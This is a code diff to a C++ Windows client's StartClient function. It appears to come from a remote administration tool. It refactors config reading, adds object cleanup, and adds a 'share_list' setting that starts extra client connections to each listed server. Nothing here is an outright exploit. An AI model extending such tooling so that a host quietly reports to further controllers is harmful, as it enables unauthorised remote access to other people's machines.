@@ -500,12 +500,12 @@ DWORD WINAPI StartClient(LPVOID lParam)
     ClientApp& app(*(ClientApp*)lParam);
     CONNECT_ADDRESS& settings(*(app.g_Connection));
     BOOL assigned = FALSE;
+    iniFile cfg(CLIENT_PATH);
     double valid_to = 0;
     std::string ip = settings.ServerIP();
     int port = settings.ServerPort();
     Mprintf("StartClient begin[%s:%d]\n", ip.c_str(), port);
     if (!app.m_bShared) {
-        iniFile cfg(CLIENT_PATH);
         auto now = time(0);
         valid_to = atof(cfg.GetStr("settings", "valid_to").c_str());
         if (assigned = now <= valid_to) {
@@ -526,10 +526,18 @@ DWORD WINAPI StartClient(LPVOID lParam)
         // The main ClientApp.
         settings.SetServer(list[0].c_str(), settings.ServerPort());
     }
+    if (!app.m_bShared) {
+        auto a = cfg.GetStr("settings", "share_list");
+        auto shareList = a.empty() ? std::vector<std::string>{} : StringToVector(a, '|');
+        for (int i = 0; i < shareList.size(); ++i) {
+            auto a = NewClientStartArg(shareList[i].c_str(), IsSharedRunning, TRUE);
+            if (nullptr != a) CloseHandle(__CreateThread(0, 0, StartClientApp, a, 0, 0));
+            Mprintf("[StartClient] Client is shared to %s.\n", shareList[i].c_str());
+        }
+    }
     std::string expiredDate;
     BOOL isAuthKernel = IsAuthKernel(expiredDate);
     if (isAuthKernel) ParseAuthServer(&settings);
-    iniFile cfg(CLIENT_PATH);
     std::string pubIP = cfg.GetStr("settings", "public_ip", "");
     // V2 authorization supports offline mode, verify signature and skip timeout check
     VERIFY_V2_AND_SET_AUTHORIZED();
@@ -566,6 +574,7 @@ DWORD WINAPI StartClient(LPVOID lParam)
         LOGIN_INFOR login = GetLoginInfo(GetTickCount64() - dwTickCount, settings, expiredDate);
         Manager = isAuthKernel ? new AuthKernelManager(&settings, ClientObject, app.g_hInstance, kb, bExit) :
                   new CKernelManager(&settings, ClientObject, app.g_hInstance, kb, bExit);
+        Manager->SetClientApp(&app);
         Manager->SetLoginMsg(login.szStartTime + std::string("|") + std::to_string(settings.clientID));
         while (ClientObject->IsRunning() && ClientObject->IsConnected() && !ClientObject->SendLoginInfo(login))
             WAIT_n(app.m_bIsRunning(&app), 5 + time(0)%10, 200);
@@ -584,6 +593,7 @@ DWORD WINAPI StartClient(LPVOID lParam)
             Sleep(200);
     }
     kb->Exit(10);
+    SAFE_DELETE(kb);
     if (app.g_bExit == S_CLIENT_EXIT && app.g_hEvent && !app.m_bShared) {
         BOOL b = SetEvent(app.g_hEvent);
         Mprintf(">>> [StartClient] Set event: %s %s!\n", EVENT_FINISHED, b ? "succeed" : "failed");
